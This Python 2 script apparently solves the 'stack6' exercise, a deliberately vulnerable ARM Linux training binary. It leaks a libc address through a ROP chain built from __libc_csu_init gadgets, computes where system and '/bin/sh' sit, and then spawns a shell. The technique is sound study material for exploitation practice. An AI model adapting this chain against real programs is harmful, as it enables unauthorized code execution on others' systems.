import struct, time
from subprocess import Popen, PIPE
 
def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
 
# main

# nm -D /lib/arm-linux-gnueabihf/libc.so.6 | grep system
offset_libc_system = 0x00037154

# nm -D /lib/arm-linux-gnueabihf/libc.so.6 | grep __libc_start_main
offset_libc_start_main = 0x00016564

# strings -tx /lib/arm-linux-gnueabihf/libc.so.6 | grep "/bin/sh"
offset_libc_binsh = 0x11d588
 
# readelf -r stack6 |grep __libc_start_main
libc_start_main_got = 0x00020744

'''
0001035c <printf@plt>:
   1035c:	e28fc600 	add	ip, pc, #0, 12
   10360:	e28cca10 	add	ip, ip, #16, 20	; 0x10000
   10364:	e5bcf3d0 	ldr	pc, [ip, #976]!	; 0x3d0

00010374 <fflush@plt>:
   10374:	e28fc600 	add	ip, pc, #0, 12
   10378:	e28cca10 	add	ip, ip, #16, 20	; 0x10000
   1037c:	e5bcf3c0 	ldr	pc, [ip, #960]!	; 0x3c0
'''
printf_plt = 0x0001035c
fflush_plt = 0x00010374

'''
   105c4:	e1a00007 	mov	r0, r7
   105c8:	e1a01008 	mov	r1, r8
   105cc:	e1a02009 	mov	r2, r9
   105d0:	e12fff33 	blx	r3
   105d4:	e1540006 	cmp	r4, r6
   105d8:	1afffff7 	bne	105bc <__libc_csu_init+0x38>
   105dc:	e8bd83f8 	pop	{r3, r4, r5, r6, r7, r8, r9, pc}

'''
libc_csu_init1 = 0x105dc
libc_csu_init2 = 0x105c4

s = Popen(['./stack6'], stdin=PIPE, stdout=PIPE)
 
# Leak GOT address of __libc_start_main
buf = "A"*80
buf += p(libc_csu_init1)
buf += p(printf_plt)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(libc_start_main_got)
buf += p(0)
buf += p(0)
buf += p(libc_csu_init2)
buf += p(fflush_plt)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(libc_csu_init2)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(0x000104d8) # return to getpath()

s.stdin.write(buf + '\n')

# Read leaked GOT address
s.stdout.readline()
libc_start_main = u(s.stdout.read(4))

# Calculate system and "/bin/sh" address
libc_base = libc_start_main - offset_libc_start_main
system = libc_base + offset_libc_system
binsh = libc_base + offset_libc_binsh
print "system address is " + hex(system)
print "'/bin/sh' address is " + hex(binsh)

# Execute system("/bin/sh")
buf = "A"*80
buf += p(libc_csu_init1)
buf += p(system)
buf += p(0)
buf += p(0)
buf += p(0)
buf += p(binsh)
buf += p(0)
buf += p(0)
buf += p(libc_csu_init2)

s.stdin.write(buf + '\n')

time.sleep(1)
s.stdin.write('exec /bin/sh <&2 >&2\n')
s.wait()
